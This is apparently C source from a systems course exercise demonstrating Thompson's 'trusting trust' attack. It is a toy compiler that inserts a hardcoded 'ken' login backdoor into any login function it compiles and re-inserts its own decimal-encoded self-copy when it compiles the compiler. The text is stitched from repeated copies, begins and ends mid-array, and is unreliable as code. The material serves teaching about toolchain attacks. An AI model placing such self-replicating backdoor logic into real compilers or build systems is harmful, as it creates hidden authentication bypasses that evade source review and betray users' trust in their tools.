	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	108, 	111, 	103, 	105, 	110, 	78, 	101, 	120,
	116, 	76, 	105, 	110, 	101, 	71, 	101, 	116,
	32, 	61, 	32, 	49, 	59, 	10, 	32, 	32,
	125, 	10, 	32, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	41,
	32, 	61, 	61, 	32, 	48, 	32, 	38, 	38,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	61, 	32,
	48, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	43, 	61, 	32,
	49, 	59, 	10, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	115, 	101, 	99,
	111, 	110, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	49, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	32,
	101, 	108, 	115, 	101, 	32, 	105, 	102, 	32,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	108, 	105, 	110, 	101, 	44, 	32, 	116, 	104,
	105, 	114, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	50, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	10,
	32, 	32, 	108, 	105, 	110, 	101, 	32, 	61,
	32, 	115, 	116, 	114, 	116, 	111, 	107, 	40,
	78, 	85, 	76, 	76, 	44, 	32, 	34, 	92,
	110, 	34, 	41, 	59, 	32, 	47, 	47, 	32,
	67, 	111, 	110, 	116, 	105, 	110, 	117, 	101,
	32, 	116, 	111, 	32, 	116, 	111, 	107, 	101,
	110, 	105, 	122, 	101, 	32, 	116, 	104, 	101,
	32, 	115, 	116, 	114, 	105, 	110, 	103, 	10,
	125, 	10, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	10, 	10, 	99,
	104, 	97, 	114, 	32, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	91, 	49, 	48,
	48, 	93, 	59, 	10, 	70, 	73, 	76, 	69,
	32, 	42, 	100, 	101, 	98, 	117, 	103, 	32,
	61, 	32, 	102, 	111, 	112, 	101, 	110, 	40,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	34, 	44, 	32,
	34, 	114, 	34, 	41, 	59, 	10, 	97, 	115,
	115, 	101, 	114, 	116, 	40, 	100, 	101, 	98,
	117, 	103, 	41, 	59, 	10, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	102, 	103, 	101, 	116,
	115, 	40, 	100, 	101, 	98, 	117, 	103, 	76,
	105, 	110, 	101, 	44, 	32, 	115, 	105, 	122,
	101, 	111, 	102, 	40, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	41, 	44, 	32,
	100, 	101, 	98, 	117, 	103, 	41, 	32, 	33,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	34, 	37, 	115, 	34, 	44,
	32, 	100, 	101, 	98, 	117, 	103, 	76, 	105,
	110, 	101, 	41, 	59, 	10, 	125, 0 };
FILE *output = fp;
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char first_line[] =
    "static void compile(char *program, char *outname) {";
static char second_line[] = "  FILE *fp = fopen(\"./temp-out.c\", \"w\");";
static char third_line[] = "  assert(fp);";
char loginNextLineGet = 0;
char compilerNextLineGet = 0;
char *line = strtok(program, "\n");
while (line != NULL) {
  if (loginNextLineGet == 1) {
    fprintf(output, "%s", login_attack);
    loginNextLineGet = 0;
  }
  if (compilerNextLineGet == 3) {
    int i;
    fprintf(output, "%s", "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
      fprintf(output, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(output, "%s", "0 };\n");
    fprintf(output, "%s", prog);
    compilerNextLineGet = 0;
    line = strtok(NULL, "\n");
    // continue;
  }
  fprintf(output, "%s\n", line);
  if (strcmp(line, login_sig) == 0) {
    loginNextLineGet = 1;
  }
  if (strcmp(line, first_line) == 0 && compilerNextLineGet == 0) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, second_line) == 0 && compilerNextLineGet == 1) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, third_line) == 0 && compilerNextLineGet == 2) {
    compilerNextLineGet += 1;
  }
  line = strtok(NULL, "\n"); // Continue to tokenize the string
}
fclose(fp);

char debugLine[100];
FILE *debug = fopen("./temp-out.c", "r");
assert(debug);
while (fgets(debugLine, sizeof(debugLine), debug) != NULL) {
  printf("%s", debugLine);
}  fclose(fp);
  // for step 2 you will pattern match on
  //   "static void compile(char *program, char *outname) {"
  // and inject the attack
  // match on login....
  // and inject an attack for "ken"
  // gross, call gcc.
  char buf[1024];
  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness", outname);
  if (system(buf) != 0)
    error("system failed\n");
}
#define N 8 * 1024 * 1024
static char buf[N + 1];
int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);
  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);
  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");
  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)
// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);
char prog[] = {
	70, 	73, 	76, 	69, 	32, 	42, 	111, 	117,
	116, 	112, 	117, 	116, 	32, 	61, 	32, 	102,
	112, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	110,
	116, 	32, 	108, 	111, 	103, 	105, 	110, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	117, 	115,
	101, 	114, 	41, 	32, 	123, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	91,
	93, 	32, 	61, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	44, 	32, 	99, 	104, 	97, 	114,
	32, 	42, 	111, 	117, 	116, 	110, 	97, 	109,
	101, 	41, 	32, 	123, 	34, 	59, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	115, 	101, 	99, 	111, 	110,
	100, 	95, 	108, 	105, 	110, 	101, 	91, 	93,
	32, 	61, 	32, 	34, 	32, 	32, 	70, 	73,
	76, 	69, 	32, 	42, 	102, 	112, 	32, 	61,
	32, 	102, 	111, 	112, 	101, 	110, 	40, 	92,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	92, 	34, 	44,
	32, 	92, 	34, 	119, 	92, 	34, 	41, 	59,
	34, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	116,
	104, 	105, 	114, 	100, 	95, 	108, 	105, 	110,
	101, 	91, 	93, 	32, 	61, 	32, 	34, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	34, 	59, 	10, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	32, 	48,
	59, 	10, 	99, 	104, 	97, 	114, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	32, 	48, 	59, 	10,
	99, 	104, 	97, 	114, 	32, 	42, 	108, 	105,
	110, 	101, 	32, 	61, 	32, 	115, 	116, 	114,
	116, 	111, 	107, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	34, 	92, 	110,
	34, 	41, 	59, 	10, 	119, 	104, 	105, 	108,
	101, 	32, 	40, 	108, 	105, 	110, 	101, 	32,
	33, 	61, 	32, 	78, 	85, 	76, 	76, 	41,
	32, 	123, 	10, 	32, 	32, 	105, 	102, 	32,
	40, 	108, 	111, 	103, 	105, 	110, 	78, 	101,
	120, 	116, 	76, 	105, 	110, 	101, 	71, 	101,
	116, 	32, 	61, 	61, 	32, 	49, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	111, 	117,
	116, 	112, 	117, 	116, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	108,
	111, 	103, 	105, 	110, 	78, 	101, 	120, 	116,
	76, 	105, 	110, 	101, 	71, 	101, 	116, 	32,
	61, 	32, 	48, 	59, 	10, 	32, 	32, 	125,
	10, 	32, 	32, 	105, 	102, 	32, 	40, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	61, 	32, 	51, 	41,
	32, 	123, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	99, 	104, 	97, 	114, 	32, 	112, 	114,
	111, 	103, 	91, 	93, 	32, 	61, 	32, 	123,
	92, 	110, 	34, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	32, 	61, 	32, 	48, 	59, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	59, 	32, 	105,
	43, 	43, 	41, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	92, 	116, 	37, 	100, 	44,
	37, 	99, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	91, 	105, 	93, 	44, 	32, 	40, 	105,
	32, 	43, 	32, 	49, 	41, 	32, 	37, 	32,
	56, 	32, 	61, 	61, 	32, 	48, 	32, 	63,
	32, 	39, 	92, 	110, 	39, 	32, 	58, 	32,
	39, 	32, 	39, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	48, 	32, 	125, 	59, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	114,
	78, 	101, 	120, 	116, 	76, 	105, 	110, 	101,
	71, 	101, 	116, 	32, 	61, 	32, 	48, 	59,
	10, 	32, 	32, 	32, 	32, 	108, 	105, 	110,
	101, 	32, 	61, 	32, 	115, 	116, 	114, 	116,
	111, 	107, 	40, 	78, 	85, 	76, 	76, 	44,
	32, 	34, 	92, 	110, 	34, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	47, 	47, 	32, 	99,
	111, 	110, 	116, 	105, 	110, 	117, 	101, 	59,
	10, 	32, 	32, 	125, 	10, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	92, 	110, 	34, 	44, 	32, 	108,
	105, 	110, 	101, 	41, 	59, 	10, 	32, 	32,
	105, 	102, 	32, 	40, 	115, 	116, 	114, 	99,
	109, 	112, 	40, 	108, 	105, 	110, 	101, 	44,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	108, 	111, 	103, 	105, 	110, 	78, 	101, 	120,
	116, 	76, 	105, 	110, 	101, 	71, 	101, 	116,
	32, 	61, 	32, 	49, 	59, 	10, 	32, 	32,
	125, 	10, 	32, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	41,
	32, 	61, 	61, 	32, 	48, 	32, 	38, 	38,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	61, 	32,
	48, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	43, 	61, 	32,
	49, 	59, 	10, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	115, 	101, 	99,
	111, 	110, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	49, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	32,
	101, 	108, 	115, 	101, 	32, 	105, 	102, 	32,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	108, 	105, 	110, 	101, 	44, 	32, 	116, 	104,
	105, 	114, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	50, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	10,
	32, 	32, 	108, 	105, 	110, 	101, 	32, 	61,
	32, 	115, 	116, 	114, 	116, 	111, 	107, 	40,
	78, 	85, 	76, 	76, 	44, 	32, 	34, 	92,
	110, 	34, 	41, 	59, 	32, 	47, 	47, 	32,
	67, 	111, 	110, 	116, 	105, 	110, 	117, 	101,
	32, 	116, 	111, 	32, 	116, 	111, 	107, 	101,
	110, 	105, 	122, 	101, 	32, 	116, 	104, 	101,
	32, 	115, 	116, 	114, 	105, 	110, 	103, 	10,
	125, 	10, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	10, 	10, 	99,
	104, 	97, 	114, 	32, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	91, 	49, 	48,
	48, 	93, 	59, 	10, 	70, 	73, 	76, 	69,
	32, 	42, 	100, 	101, 	98, 	117, 	103, 	32,
	61, 	32, 	102, 	111, 	112, 	101, 	110, 	40,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	34, 	44, 	32,
	34, 	114, 	34, 	41, 	59, 	10, 	97, 	115,
	115, 	101, 	114, 	116, 	40, 	100, 	101, 	98,
	117, 	103, 	41, 	59, 	10, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	102, 	103, 	101, 	116,
	115, 	40, 	100, 	101, 	98, 	117, 	103, 	76,
	105, 	110, 	101, 	44, 	32, 	115, 	105, 	122,
	101, 	111, 	102, 	40, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	41, 	44, 	32,
	100, 	101, 	98, 	117, 	103, 	41, 	32, 	33,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	34, 	37, 	115, 	34, 	44,
	32, 	100, 	101, 	98, 	117, 	103, 	76, 	105,
	110, 	101, 	41, 	59, 	10, 	125, 0 };
FILE *output = fp;
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char first_line[] =
    "static void compile(char *program, char *outname) {";
static char second_line[] = "  FILE *fp = fopen(\"./temp-out.c\", \"w\");";
static char third_line[] = "  assert(fp);";
char loginNextLineGet = 0;
char compilerNextLineGet = 0;
char *line = strtok(program, "\n");
while (line != NULL) {
  if (loginNextLineGet == 1) {
    fprintf(output, "%s", login_attack);
    loginNextLineGet = 0;
  }
  if (compilerNextLineGet == 3) {
    int i;
    fprintf(output, "%s", "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
      fprintf(output, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(output, "%s", "0 };\n");
    fprintf(output, "%s", prog);
    compilerNextLineGet = 0;
    line = strtok(NULL, "\n");
    // continue;
  }
  fprintf(output, "%s\n", line);
  if (strcmp(line, login_sig) == 0) {
    loginNextLineGet = 1;
  }
  if (strcmp(line, first_line) == 0 && compilerNextLineGet == 0) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, second_line) == 0 && compilerNextLineGet == 1) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, third_line) == 0 && compilerNextLineGet == 2) {
    compilerNextLineGet += 1;
  }
  line = strtok(NULL, "\n"); // Continue to tokenize the string
}
fclose(fp);

char debugLine[100];
FILE *debug = fopen("./temp-out.c", "r");
assert(debug);
while (fgets(debugLine, sizeof(debugLine), debug) != NULL) {
  printf("%s", debugLine);
}  fclose(fp);
  // for step 2 you will pattern match on
  //   "static void compile(char *program, char *outname) {"
  // and inject the attack
  // match on login....
  // and inject an attack for "ken"
  // gross, call gcc.
  char buf[1024];
  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness", outname);
  if (system(buf) != 0)
    error("system failed\n");
}
#define N 8 * 1024 * 1024
static char buf[N + 1];
int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);
  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);
  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");
  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)
// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);
char prog[] = {
	70, 	73, 	76, 	69, 	32, 	42, 	111, 	117,
	116, 	112, 	117, 	116, 	32, 	61, 	32, 	102,
	112, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	110,
	116, 	32, 	108, 	111, 	103, 	105, 	110, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	117, 	115,
	101, 	114, 	41, 	32, 	123, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	91,
	93, 	32, 	61, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	44, 	32, 	99, 	104, 	97, 	114,
	32, 	42, 	111, 	117, 	116, 	110, 	97, 	109,
	101, 	41, 	32, 	123, 	34, 	59, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	115, 	101, 	99, 	111, 	110,
	100, 	95, 	108, 	105, 	110, 	101, 	91, 	93,
	32, 	61, 	32, 	34, 	32, 	32, 	70, 	73,
	76, 	69, 	32, 	42, 	102, 	112, 	32, 	61,
	32, 	102, 	111, 	112, 	101, 	110, 	40, 	92,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	92, 	34, 	44,
	32, 	92, 	34, 	119, 	92, 	34, 	41, 	59,
	34, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	116,
	104, 	105, 	114, 	100, 	95, 	108, 	105, 	110,
	101, 	91, 	93, 	32, 	61, 	32, 	34, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	34, 	59, 	10, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	32, 	48,
	59, 	10, 	99, 	104, 	97, 	114, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	32, 	48, 	59, 	10,
	99, 	104, 	97, 	114, 	32, 	42, 	108, 	105,
	110, 	101, 	32, 	61, 	32, 	115, 	116, 	114,
	116, 	111, 	107, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	34, 	92, 	110,
	34, 	41, 	59, 	10, 	119, 	104, 	105, 	108,
	101, 	32, 	40, 	108, 	105, 	110, 	101, 	32,
	33, 	61, 	32, 	78, 	85, 	76, 	76, 	41,
	32, 	123, 	10, 	32, 	32, 	105, 	102, 	32,
	40, 	108, 	111, 	103, 	105, 	110, 	78, 	101,
	120, 	116, 	76, 	105, 	110, 	101, 	71, 	101,
	116, 	32, 	61, 	61, 	32, 	49, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	111, 	117,
	116, 	112, 	117, 	116, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	108,
	111, 	103, 	105, 	110, 	78, 	101, 	120, 	116,
	76, 	105, 	110, 	101, 	71, 	101, 	116, 	32,
	61, 	32, 	48, 	59, 	10, 	32, 	32, 	125,
	10, 	32, 	32, 	105, 	102, 	32, 	40, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	61, 	32, 	51, 	41,
	32, 	123, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	99, 	104, 	97, 	114, 	32, 	112, 	114,
	111, 	103, 	91, 	93, 	32, 	61, 	32, 	123,
	92, 	110, 	34, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	32, 	61, 	32, 	48, 	59, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	59, 	32, 	105,
	43, 	43, 	41, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	92, 	116, 	37, 	100, 	44,
	37, 	99, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	91, 	105, 	93, 	44, 	32, 	40, 	105,
	32, 	43, 	32, 	49, 	41, 	32, 	37, 	32,
	56, 	32, 	61, 	61, 	32, 	48, 	32, 	63,
	32, 	39, 	92, 	110, 	39, 	32, 	58, 	32,
	39, 	32, 	39, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	48, 	32, 	125, 	59, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
